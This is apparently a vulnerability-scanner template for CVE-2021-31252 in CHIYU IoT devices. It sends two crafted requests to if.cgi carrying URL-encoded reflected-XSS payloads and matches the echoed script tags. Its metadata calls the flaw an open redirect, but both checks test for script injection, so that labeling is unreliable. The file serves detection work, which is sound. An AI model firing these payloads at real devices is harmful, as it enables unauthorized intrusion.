id: CVE-2021-31252

info:
  name: CHIYU IoT Devices Open Redirect Vulnerability
  author: ProjectDiscoveryAI
  severity: medium
  description: An open redirect vulnerability exists in various CHIYU Technology IoT devices that can be exploited via specially crafted URLs.
  impact: |
    An attacker can redirect users to malicious websites, leading to phishing attacks or malware downloads.
  remediation: |
    Apply the vendor-provided patch or update to the latest firmware version to mitigate the vulnerability.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2021-31252
    cwe-id: CWE-601
    epss-score: 0.00124
    epss-percentile: 0.48297
    cpe: cpe:2.3:o:chiyu-tech:bf-430_firmware:-:*:*:*:*:*:*:*
  metadata:
    vendor: chiyu-tech
    product: bf-430_firmware

http:
  - method: GET
    path:
      - "{{BaseURL}}/if.cgi?redirect=EmpRcd.htm&failure=fail.htm&type=user_data&creg=0&num=&EmployeeID=0000&MarkID=0000&CardID=000000&username=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&Card_Valid=0&SY=2021&SM=2&SD=7&sy_h=16&sy_m=23&EY=2021&EM=2&ED=7&sy_h=16&sy_m=23&Activate=5&Usertype=0&group_list1=1&group_list2=0&group_list3=0&group_list4=0&Verify=1&Password=&Retype=&card=0&card=0&card=0&card=0&card=0&card=116&card=9&card=138"

    matchers:
      - type: word
        words:
          - "<script>alert(1)</script>"
        part: body

  - method: GET
    path:
      - "{{BaseURL}}/if.cgi?redirect=setting.htm&failure=fail.htm&type=ap_tcps_apply&TF_ip=443&TF_submask=0&TF_submask=%22%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E&radio_ping_block=0&max_tcp=3&B_apply=APPLY"

    matchers:
      - type: word
        words:
          - "<script>alert(123)</script>"
        part: body
